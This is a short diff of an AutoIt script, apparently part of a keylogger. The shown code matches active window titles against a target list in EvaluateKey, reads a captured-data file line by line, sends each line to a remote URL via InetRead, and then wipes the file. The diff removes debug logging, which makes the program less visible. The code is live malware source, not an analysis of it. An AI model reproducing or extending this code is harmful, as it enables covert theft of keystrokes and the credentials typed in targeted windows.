@@ -109,12 +109,10 @@ Func send_file($forced_action)
             Local $aArray = FileReadToArray($file_name)
             For $i = 0 To UBound($aArray) - 1
                 InetRead($url & $aArray[$i], $INET_FORCERELOAD)
-	debug_info($url & $aArray[$i])
             Next
             ; Vaciar el contenido del archivo en lugar de eliminarlo
             $file = FileOpen($file_name, $FO_OVERWRITE)
-
-            FileClose($file)
+           FileClose($file)
         EndIf
         $last_send = TimerInit() ; Actualiza el tiempo de último envío
     EndIf
@@ -127,9 +125,7 @@ Func EvaluateKey($keycode)
 	Local $bFound = False
 
 	For $i = 0 To UBound($aTitles) - 1
-		debug_info("buscada:"&StringLeft($currentActiveWindow, StringLen($aTitles[$i])) & " ******    evaluada:" &$aTitles[$i])
 		If StringLeft($currentActiveWindow, StringLen($aTitles[$i])) = $aTitles[$i] Then
-			debug_info("encontrada!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
 			$bFound = True
 			ExitLoop
 		EndIf
